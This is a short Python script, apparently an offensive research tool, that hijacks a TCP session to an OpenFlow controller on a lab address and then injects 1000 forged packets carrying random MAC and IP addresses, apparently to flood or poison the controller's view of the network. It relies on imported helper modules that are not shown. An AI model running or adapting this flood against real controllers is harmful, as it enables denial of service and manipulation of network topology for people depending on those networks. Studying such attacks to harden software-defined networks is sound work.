import sys
import random
from craft_faked import *
from sniff_thread import *
from tcp_handshake import *
from openflow_session_scenario import *


if len(sys.argv)<2:
    print("Usage [interface]")
    exit()

t = TcpHandshake(("192.168.56.102",6633),sys.argv[1])
t.start()

sniffing_thread = Sniff_thread(sys.argv[1],"192.168.56.102",6633,t.sport,1000)
sniffing_thread.threaded_sniff()

analyse_scenario = Openflow_session_scenario(sniffing_thread,t,random.randint(1,1900)*16*16*16*16*16*16+0xffff)
analyse_scenario.launch_threaded()

time.sleep(5)

def random_mac():
    return ':'.join([''.join([charset[random.randint(0,len(charset)-1)] for _ in range(2)]) for _ in range(6)])

def random_ip():
    return ''.join([charset[random.randint(0,len(charset)-1)] for _ in range(8)])

charset = [chr(i) for i in range(ord('0'),ord('9')+1)]
charset.extend([chr(i) for i in range(ord('a'),ord('f')+1)])
for i in range(1000):
    print("(((((((((((((((((((((((((((((((((((((((((((((((((((((((())))))))))))))))))))))))))))))))))))))))))))))))))))))))")
    print("(((((((((((((((((((((((((((((((((((((((((((((((((((((((())))))))))))))))))))))))))))))))))))))))))))))))))))))))")
    print("(((((((((((((((((((((((((((((((((((((((((((((((((((((((())))))))))))))))))))))))))))))))))))))))))))))))))))))))")
    print("(((((((((((((((((((((((((((((((((((((((((((((((((((((((())))))))))))))))))))))))))))))))))))))))))))))))))))))))")
    print(random_mac())
    print(random_ip())
    craft_packets = Craft_faked(t, "PING", (random_mac(), "ba:d1:de:a0:00:00", random_ip(), 'c0a8383a'))
    craft_packets.send()


analyse_scenario.end()
